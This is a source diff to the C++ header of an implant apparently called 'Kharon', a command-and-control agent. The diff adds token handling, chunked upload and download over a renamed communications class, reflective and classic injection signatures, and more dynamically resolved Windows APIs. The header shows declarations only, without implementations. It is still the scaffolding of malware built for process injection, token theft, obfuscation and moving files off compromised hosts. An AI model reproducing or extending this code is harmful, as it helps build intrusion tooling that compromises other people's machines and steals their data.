@@ -29,6 +29,8 @@ EXTERN_C UPTR EndPtr();
 
 /* ========= [ Config ] ========= */
 
+#define KH_CHUNK_SIZE 512000 // 512 KB
+
 #ifndef KH_AGENT_UUID
 #define KH_AGENT_UUID ""
 #endif // KH_AGENT_UUID
@@ -115,19 +117,21 @@ class Thread;
 class Process;
 class Heap;
 class Library;
-class Transfer;
+class Communics;
+class Token;
 
 namespace Root {
 
     class Kharon {    
     public:
         Library*   Lib;
+        Token*     Tkn;
         Heap*      Hp;
         Process*   Ps;
         Thread*    Td;
         Memory*    Mm;
         Task*      Tk;
-        Transfer*  Tf;
+        Communics* Cmm;
         Obfuscate* Obf;
         Injection* Inj;
         Parser*    Psr;
@@ -199,6 +203,20 @@ namespace Root {
             } Web;
 
             struct {
+                struct {
+                    PCHAR FileID;
+                    ULONG ChunkSize;
+                    ULONG CurrentChunk;
+                    ULONG TotalChunks;
+                    PCHAR Path;
+               } Up;
+               
+               struct {
+
+               } Down;
+            } Tf;
+
+            struct {
                 PCHAR Name;
             } Pipe;
         } Transport = {
@@ -260,7 +278,6 @@ namespace Root {
             BOOL  BlockDlls;
             PCHAR CurrentDir;
             BOOL  Pipe;
-
         } PsCtx = {
             .ParentID   = 0,
             .BlockDlls  = FALSE,
@@ -276,7 +293,9 @@ namespace Root {
             DECLAPI( GetModuleHandleA );
 
             DECLAPI( DuplicateHandle );
-        
+            DECLAPI( SetHandleInformation );
+            DECLAPI( GetStdHandle );
+
             DECLAPI( CreateFileA );
             DECLAPI( CreateFileW );
             DECLAPI( CreatePipe );
@@ -289,6 +308,8 @@ namespace Root {
             DECLAPI( CopyFileA );
             DECLAPI( MoveFileA );
             DECLAPI( ReadFile );
+            DECLAPI( WriteFile );
+            DECLAPI( WriteFileEx );
             DECLAPI( SetCurrentDirectoryA );
             DECLAPI( GetFileSize );
             DECLAPI( FileTimeToSystemTime );
@@ -298,6 +319,7 @@ namespace Root {
         
             DECLAPI( CreateProcessA );
             DECLAPI( OpenProcess );
+            DECLAPI( IsWow64Process );
         
             DECLAPI( GetComputerNameExA );
         
@@ -316,8 +338,6 @@ namespace Root {
             DECLAPI( LocalAlloc   );
             DECLAPI( LocalReAlloc );
             DECLAPI( LocalFree    );
-
-            DECLAPI( WriteFileEx );
         
             DECLAPI( VirtualProtect );
             DECLAPI( VirtualProtectEx );
@@ -336,6 +356,8 @@ namespace Root {
             RSL_TYPE( GetModuleHandleA ),
 
             RSL_TYPE( DuplicateHandle ),
+            RSL_TYPE( SetHandleInformation ),
+            RSL_TYPE( GetStdHandle ),
         
             RSL_TYPE( CreateFileA ),
             RSL_TYPE( CreateFileW ),
@@ -349,6 +371,8 @@ namespace Root {
             RSL_TYPE( CopyFileA ),
             RSL_TYPE( MoveFileA ),
             RSL_TYPE( ReadFile ),
+            RSL_TYPE( WriteFile ),
+            RSL_TYPE( WriteFileEx ),
             RSL_TYPE( SetCurrentDirectoryA ),
             RSL_TYPE( GetFileSize ),
             RSL_TYPE( FileTimeToSystemTime ),
@@ -358,6 +382,7 @@ namespace Root {
         
             RSL_TYPE( CreateProcessA ),
             RSL_TYPE( OpenProcess ),
+            RSL_TYPE( IsWow64Process ),
         
             RSL_TYPE( GetComputerNameExA ),
         
@@ -377,8 +402,6 @@ namespace Root {
             RSL_TYPE( LocalReAlloc ),
             RSL_TYPE( LocalFree    ),
         
-            RSL_TYPE( WriteFileEx ),
-
             RSL_TYPE( VirtualProtect ),
             RSL_TYPE( VirtualProtectEx ),
             RSL_TYPE( VirtualAlloc ),
@@ -423,6 +446,7 @@ namespace Root {
     
             DECLAPI( NtSetInformationVirtualMemory );
     
+            DECLAPI( NtQueryInformationToken );
             DECLAPI( NtQueryInformationProcess );
             DECLAPI( NtQuerySystemInformation );
 
@@ -467,6 +491,7 @@ namespace Root {
     
             RSL_TYPE( NtSetInformationVirtualMemory ),
 
+            RSL_TYPE( NtQueryInformationToken ),
             RSL_TYPE( NtQueryInformationProcess ),
             RSL_TYPE( NtQuerySystemInformation ),
     
@@ -486,7 +511,8 @@ namespace Root {
                 
         struct {
             UPTR Handle;
-
+            DECLAPI( LookupAccountSidW );
+            DECLAPI( LookupAccountSidA );
             DECLAPI( OpenProcessToken    );
             DECLAPI( GetTokenInformation );
 
@@ -496,6 +522,8 @@ namespace Root {
             DECLAPI( RegQueryValueExA );
             DECLAPI( RegCloseKey      );
         } Advapi32 = {
+            RSL_TYPE( LookupAccountSidW ),
+            RSL_TYPE( LookupAccountSidA ),
             RSL_TYPE( OpenProcessToken ),
             RSL_TYPE( GetTokenInformation ),
 
@@ -550,12 +578,13 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitToken( Token* TokenRf ) { Tkn = TokenRf; } 
         VOID InitHeap( Heap* HeapRf ) { Hp = HeapRf; } 
         VOID InitLibrary( Library* LibRf ) { Lib = LibRf; }
         VOID InitThread( Thread* ThreadRf ) { Td = ThreadRf; }
         VOID InitProcess( Process* ProcessRf ) { Ps = ProcessRf; }
         VOID InitTask( Task* TaskRf ) { Tk = TaskRf; }
-        VOID InitTransfer( Transfer* TransferRf ) { Tf = TransferRf; }
+        VOID InitCommunics( Communics* CommunicsRf ) { Cmm = CommunicsRf; }
         VOID InitPackage( Package* PackageRf ) { Pkg = PackageRf; }
         VOID InitParser( Parser* ParserRf ) { Psr = ParserRf; }
         VOID InitObfuscate( Obfuscate* ObfuscateRf ) { Obf = ObfuscateRf; }
@@ -563,6 +592,15 @@ namespace Root {
         VOID InitMemory( Memory* MemoryRf ) { Mm = MemoryRf; }
     };
 }
+
+class Resolve {
+private:
+    Root::Kharon* Kh;
+public:
+    Resolve( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+
+
+};
 
 class Package {
 private:
@@ -721,11 +759,11 @@ public:
     ) -> BOOL;   
 };
 
-class Transfer {    
+class Communics {    
 private:
     Root::Kharon* Kh;
 public:
-    Transfer( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+    Communics( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
 
     auto Checkin(
         VOID
@@ -750,6 +788,14 @@ public:
     ) -> VOID;
 
     auto Injection(
+        _In_ PPARSER Parser
+    ) -> ERROR_CODE;
+
+    auto Download(
+        _In_ PPARSER Parser
+    ) -> ERROR_CODE;
+    
+    auto Upload(
         _In_ PPARSER Parser
     ) -> ERROR_CODE;
 
@@ -861,6 +907,25 @@ public:
     ) -> UPTR;
 };
 
+class Token {
+private:
+    Root::Kharon* Kh;
+public:
+    Token( Root::Kharon* KharonRf ) : Kh( KharonRf ) {};
+
+    auto GetUser( 
+        _Out_ PCHAR *UserNamePtr, 
+        _Out_ ULONG *UserNameLen, 
+        _In_  HANDLE TokenHandle 
+    ) -> BOOL;
+
+    auto ProcOpen(
+        _In_ HANDLE  ProcessHandle,
+        _In_ ULONG   RightsAccess,
+        _In_ PHANDLE TokenHandle
+    ) -> BOOL;
+};
+
 class Heap {
 private:
     Root::Kharon* Kh;
@@ -956,14 +1021,17 @@ public:
     auto Classic(
         _In_      PBYTE   Buffer,
         _In_      UPTR    Size,
-        _In_      PVOID   Parameter,
-        _Out_opt_ PBYTE   OutBuff,
+        _In_      PVOID   Param,
+        _Out_opt_ PBYTE*  OutBuff,
         _Out_     PVOID*  Base,
         _Out_     HANDLE* ThreadHandle
     ) -> BOOL;
 
     auto Reflection(
-        VOID
+        _In_ PBYTE  Buffer,
+        _In_ ULONG  Size,
+        _In_ PVOID  Param,
+        _In_ PBYTE* OutBuff
     ) -> BOOL;
 };
 
